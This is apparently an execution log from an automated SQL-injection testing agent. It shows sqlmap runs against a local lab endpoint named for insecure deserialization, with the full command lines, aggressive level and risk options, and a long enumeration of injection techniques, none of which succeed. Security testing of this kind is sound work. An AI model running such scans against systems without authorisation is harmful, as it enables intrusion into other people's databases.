2025-09-26 18:55:59,775 - INFO - [18:55:59] [INFO] flushing session file
2025-09-26 18:55:59,788 - INFO - [18:55:59] [INFO] testing connection to the target URL
2025-09-26 18:55:59,857 - INFO - [18:55:59] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
2025-09-26 18:55:59,857 - INFO - [18:55:59] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:55:59,867 - INFO - [18:55:59] [INFO] testing if the target URL content is stable
2025-09-26 18:56:00,305 - INFO - [18:56:00] [INFO] target URL content is stable
2025-09-26 18:56:00,316 - INFO - [18:56:00] [INFO] testing if POST parameter 'test' is dynamic
2025-09-26 18:56:00,336 - INFO - [18:56:00] [WARNING] POST parameter 'test' does not appear to be dynamic
2025-09-26 18:56:00,355 - INFO - [18:56:00] [WARNING] heuristic (basic) test shows that POST parameter 'test' might not be injectable
2025-09-26 18:56:00,379 - INFO - [18:56:00] [INFO] testing for SQL injection on POST parameter 'test'
2025-09-26 18:56:00,469 - INFO - [18:56:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:56:00,557 - INFO - [18:56:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:00,573 - INFO - [18:56:00] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:56:00,623 - INFO - [18:56:00] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 18:56:00,678 - INFO - [18:56:00] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 18:56:00,730 - INFO - [18:56:00] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 18:56:00,783 - INFO - [18:56:00] [INFO] testing 'Generic inline queries'
2025-09-26 18:56:00,806 - INFO - [18:56:00] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 18:56:00,833 - INFO - [18:56:00] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 18:56:00,882 - INFO - [18:56:00] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 18:56:00,924 - INFO - [18:56:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 18:56:00,983 - INFO - [18:56:00] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 18:56:01,036 - INFO - [18:56:01] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 18:56:01,095 - INFO - [18:56:01] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 18:56:01,162 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:56:01,162 - INFO - [18:56:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:56:01,270 - INFO - [18:56:01] [WARNING] POST parameter 'test' does not seem to be injectable
2025-09-26 18:56:01,270 - INFO - [18:56:01] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 18:56:01,273 - INFO - [18:56:01] [WARNING] HTTP error codes detected during run:
2025-09-26 18:56:01,273 - INFO - 500 (Internal Server Error) - 75 times
2025-09-26 18:56:01,273 - INFO - 
2025-09-26 18:56:01,273 - INFO - [*] ending @ 18:56:01 /2025-09-26/
2025-09-26 18:56:01,273 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/pickle --data test=1
--------------------------------------------------
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:55:57 /2025-09-26/

[18:55:59] [INFO] flushing session file
[18:55:59] [INFO] testing connection to the target URL
[18:55:59] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[18:55:59] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:55:59] [INFO] testing if the target URL content is stable
[18:56:00] [INFO] target URL content is stable
[18:56:00] [INFO] testing if POST parameter 'test' is dynamic
[18:56:00] [WARNING] POST parameter 'test' does not appear to be dynamic
[18:56:00] [WARNING] heuristic (basic) test shows that POST parameter 'test' might not be injectable
[18:56:00] [INFO] testing for SQL injection on POST parameter 'test'
[18:56:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:56:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:56:00] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:56:00] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:56:00] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:56:00] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:56:00] [INFO] testing 'Generic inline queries'
[18:56:00] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:56:00] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:56:00] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:56:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:56:00] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:56:01] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:56:01] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:56:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:56:01] [WARNING] POST parameter 'test' does not seem to be injectable
[18:56:01] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:56:01] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 75 times

[*] ending @ 18:56:01 /2025-09-26/

2025-09-26 18:56:01,465 - INFO - Flushed sqlmap session for http://localhost:5000/pickle (log: attack-logs-dynamic\Insecure_Deserialization_flush.log)
2025-09-26 18:56:01,466 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/pickle --output-dir 'attack-logs-dynamic\Insecure_Deserialization_sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
2025-09-26 18:56:06,218 - INFO -         ___
2025-09-26 18:56:06,218 - INFO -        __H__
2025-09-26 18:56:06,218 - INFO -  ___ ___[.]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:56:06,218 - INFO - |_ -| . [,]     | .'| . |
2025-09-26 18:56:06,218 - INFO - |___|_  [(]_|_|_|__,|  _|
2025-09-26 18:56:06,218 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:56:06,218 - INFO - 
2025-09-26 18:56:06,265 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:56:06,265 - INFO - 
2025-09-26 18:56:06,265 - INFO - [*] starting @ 18:56:06 /2025-09-26/
2025-09-26 18:56:06,265 - INFO - 
2025-09-26 18:56:08,367 - INFO - [18:56:08] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Insecure_Deserialization_sqlmap' as the output directory
2025-09-26 18:56:08,883 - INFO - [18:56:08] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 18:56:08,883 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 18:56:08,904 - INFO - [18:56:08] [INFO] testing connection to the target URL
2025-09-26 18:56:08,981 - INFO - [18:56:08] [WARNING] the web server responded with an HTTP error code (405) which could interfere with the results of the tests
2025-09-26 18:56:08,982 - INFO - [18:56:08] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:56:09,019 - INFO - [18:56:09] [INFO] testing if the target URL content is stable
2025-09-26 18:56:09,406 - INFO - [18:56:09] [INFO] target URL content is stable
2025-09-26 18:56:09,406 - INFO - [18:56:09] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 18:56:09,604 - INFO - [18:56:09] [INFO] URI parameter '#1*' appears to be dynamic
2025-09-26 18:56:09,626 - INFO - [18:56:09] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 18:56:09,644 - INFO - [18:56:09] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 18:56:09,721 - INFO - [18:56:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:56:10,659 - INFO - [18:56:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:56:11,335 - INFO - [18:56:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:56:12,147 - INFO - [18:56:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:56:12,920 - INFO - [18:56:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:56:13,374 - INFO - [18:56:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:56:13,531 - INFO - [18:56:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:56:13,716 - INFO - [18:56:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:56:13,876 - INFO - [18:56:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:56:14,195 - INFO - [18:56:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:56:14,483 - INFO - [18:56:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:56:14,875 - INFO - [18:56:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:56:15,344 - INFO - [18:56:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:56:15,697 - INFO - [18:56:15] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:56:16,373 - INFO - [18:56:16] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:56:16,954 - INFO - [18:56:16] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:56:17,461 - INFO - [18:56:17] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:56:18,156 - INFO - [18:56:18] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:56:18,697 - INFO - [18:56:18] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:56:19,399 - INFO - [18:56:19] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:56:19,991 - INFO - [18:56:19] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:56:20,714 - INFO - [18:56:20] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:56:21,278 - INFO - [18:56:21] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:56:21,991 - INFO - [18:56:21] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:56:22,649 - INFO - [18:56:22] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:56:23,296 - INFO - [18:56:23] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:56:23,940 - INFO - [18:56:23] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:23,963 - INFO - [18:56:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:56:23,980 - INFO - [18:56:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:56:24,001 - INFO - [18:56:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:56:24,015 - INFO - [18:56:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:56:24,037 - INFO - [18:56:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:56:24,047 - INFO - [18:56:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:56:24,076 - INFO - [18:56:24] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:56:24,093 - INFO - [18:56:24] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:24,114 - INFO - [18:56:24] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:56:24,141 - INFO - [18:56:24] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:56:24,165 - INFO - [18:56:24] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:56:24,199 - INFO - [18:56:24] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:24,218 - INFO - [18:56:24] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:56:24,228 - INFO - [18:56:24] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:24,258 - INFO - [18:56:24] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:56:24,280 - INFO - [18:56:24] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:24,310 - INFO - [18:56:24] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:56:24,337 - INFO - [18:56:24] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:24,355 - INFO - [18:56:24] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:56:24,378 - INFO - [18:56:24] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:56:24,406 - INFO - [18:56:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:56:24,426 - INFO - [18:56:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:56:24,445 - INFO - [18:56:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:24,485 - INFO - [18:56:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:56:24,523 - INFO - [18:56:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:24,526 - INFO - [18:56:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:56:24,528 - INFO - [18:56:24] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:24,557 - INFO - [18:56:24] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:56:24,595 - INFO - [18:56:24] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:56:24,640 - INFO - [18:56:24] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:56:24,671 - INFO - [18:56:24] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:56:24,710 - INFO - [18:56:24] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:24,746 - INFO - [18:56:24] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:56:24,783 - INFO - [18:56:24] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:24,844 - INFO - [18:56:24] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:56:24,893 - INFO - [18:56:24] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:24,941 - INFO - [18:56:24] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:56:24,987 - INFO - [18:56:24] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:56:25,029 - INFO - [18:56:25] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:56:25,062 - INFO - [18:56:25] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:56:25,646 - INFO - [18:56:25] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:56:26,039 - INFO - [18:56:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:56:26,049 - INFO - [18:56:26] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:56:26,612 - INFO - [18:56:26] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:56:27,122 - INFO - [18:56:27] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:56:27,590 - INFO - [18:56:27] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:56:28,127 - INFO - [18:56:28] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:56:28,630 - INFO - [18:56:28] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:56:29,118 - INFO - [18:56:29] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:56:29,604 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:56:29,604 - INFO - [18:56:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:56:29,913 - INFO - [18:56:29] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:56:30,186 - INFO - [18:56:30] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:56:30,469 - INFO - [18:56:30] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:56:30,768 - INFO - [18:56:30] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 18:56:30,768 - INFO - other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
2025-09-26 18:56:30,768 - INFO - [18:56:30] [INFO] testing if parameter 'User-Agent' is dynamic
2025-09-26 18:56:30,768 - INFO - [18:56:30] [WARNING] parameter 'User-Agent' does not appear to be dynamic
2025-09-26 18:56:30,787 - INFO - [18:56:30] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
2025-09-26 18:56:30,787 - INFO - [18:56:30] [INFO] testing for SQL injection on parameter 'User-Agent'
2025-09-26 18:56:30,845 - INFO - [18:56:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:56:31,240 - INFO - [18:56:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:56:31,899 - INFO - [18:56:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:56:32,267 - INFO - [18:56:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:56:32,562 - INFO - [18:56:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:56:32,914 - INFO - [18:56:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:56:32,990 - INFO - [18:56:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:56:33,114 - INFO - [18:56:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:56:33,202 - INFO - [18:56:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:56:33,363 - INFO - [18:56:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:56:33,665 - INFO - [18:56:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:56:33,832 - INFO - [18:56:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:56:34,063 - INFO - [18:56:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:56:34,330 - INFO - [18:56:34] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:56:34,636 - INFO - [18:56:34] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:56:34,936 - INFO - [18:56:34] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:56:35,514 - INFO - [18:56:35] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:56:35,824 - INFO - [18:56:35] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:56:36,366 - INFO - [18:56:36] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:56:36,688 - INFO - [18:56:36] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:56:37,157 - INFO - [18:56:37] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:56:37,456 - INFO - [18:56:37] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:56:38,090 - INFO - [18:56:38] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:56:38,484 - INFO - [18:56:38] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:56:39,005 - INFO - [18:56:39] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:56:39,294 - INFO - [18:56:39] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:56:39,826 - INFO - [18:56:39] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:39,836 - INFO - [18:56:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:56:39,836 - INFO - [18:56:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:56:39,855 - INFO - [18:56:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:56:39,865 - INFO - [18:56:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:56:39,877 - INFO - [18:56:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:56:39,888 - INFO - [18:56:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:56:39,888 - INFO - [18:56:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:56:39,908 - INFO - [18:56:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:39,924 - INFO - [18:56:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:56:39,929 - INFO - [18:56:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:56:39,939 - INFO - [18:56:39] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:56:39,955 - INFO - [18:56:39] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:39,960 - INFO - [18:56:39] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:56:39,979 - INFO - [18:56:39] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:39,983 - INFO - [18:56:39] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:56:39,992 - INFO - [18:56:39] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:40,013 - INFO - [18:56:40] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:56:40,014 - INFO - [18:56:40] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:56:40,026 - INFO - [18:56:40] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:56:40,036 - INFO - [18:56:40] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:56:40,036 - INFO - [18:56:40] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:56:40,059 - INFO - [18:56:40] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:56:40,069 - INFO - [18:56:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:40,090 - INFO - [18:56:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:56:40,106 - INFO - [18:56:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:40,106 - INFO - [18:56:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:56:40,106 - INFO - [18:56:40] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:40,127 - INFO - [18:56:40] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:56:40,151 - INFO - [18:56:40] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:56:40,168 - INFO - [18:56:40] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:56:40,187 - INFO - [18:56:40] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:56:40,206 - INFO - [18:56:40] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:40,225 - INFO - [18:56:40] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:56:40,244 - INFO - [18:56:40] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:56:40,254 - INFO - [18:56:40] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:56:40,288 - INFO - [18:56:40] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
